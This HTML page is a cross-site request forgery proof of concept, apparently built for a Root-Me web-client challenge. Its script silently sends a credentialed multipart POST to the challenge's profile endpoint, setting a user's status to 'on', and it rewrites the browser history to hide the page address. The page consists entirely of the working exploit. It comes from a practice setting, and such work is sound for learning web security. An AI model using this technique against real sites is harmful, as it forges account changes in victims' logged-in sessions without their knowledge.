<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/challenge01.root-me.org\/web-client\/ch22\/?action=profile", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------114782935826962");
        xhr.withCredentials = true;
        var body = "-----------------------------114782935826962\r\n" + 
          "Content-Disposition: form-data; name=\"username\"\r\n" + 
          "\r\n" + 
          "xyz\r\n" + 
          "-----------------------------114782935826962\r\n" + 
          "Content-Disposition: form-data; name=\"status\"\r\n" + 
          "\r\n" + 
          "on\r\n" + 
          "-----------------------------114782935826962--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
